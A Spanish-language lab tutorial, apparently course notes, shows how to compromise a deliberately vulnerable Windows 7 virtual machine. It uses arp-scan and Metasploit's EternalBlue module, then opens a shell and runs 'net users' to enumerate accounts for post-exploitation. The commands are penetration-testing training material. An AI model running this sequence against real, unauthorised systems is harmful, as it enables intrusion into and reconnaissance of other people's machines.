# Enumeración de Usuarios en Sistemas Windows

Maquinas que vamos a utilizar Kali Linux y Windows 7 Vulnerable [https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view](https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view)

vamos a conocer el funcionamiento del comando **net users** para poder ver los usuarios existentes dentro de un sistema Windows, de tal forma que podremos, lo cual nos brindará mucha información para continuar con la post-explotación

- Vamos a Comprometer una maquina Windows 7 con Metasploit aprovechando la vulnerabilidad  Eternal Blue
    
    
    ```bash
    sudo arp-scan -I eth0 --localnet
    ```
    
    ![image.png](./imagenes/image%20106.png)
    
- Lanzamos Metaesploit y buscamos eternalblue
    
    `search eternalblue`
    
    ![image.png](./imagenes/image%20107.png)
    

- Escogemos el exploit 0
    
    `use 0`
    
    ![image.png](./imagenes/image%20108.png)
    
- Hacemos un show options y rellenamos lo que necesitemos y ejecutamos
    
    `show options`
    
    `set RHOST 10.0.3.6`
    
    `run`
    
    ![image.png](./imagenes/image%20109.png)
    
- Nos pasamos a una shell dentro de Windows
    
    `shell`
    
    ![image.png](./imagenes/image%20110.png)
    

- Vamos a probar comando **net user** que no se puede ejecutar cuando estamos en meterpreter:
    - `net users`
        
        ![image.png](./imagenes/image%20111.png)
        
        Vemos que tenemos tres usuarios , **administrador, Invitado y Mario**.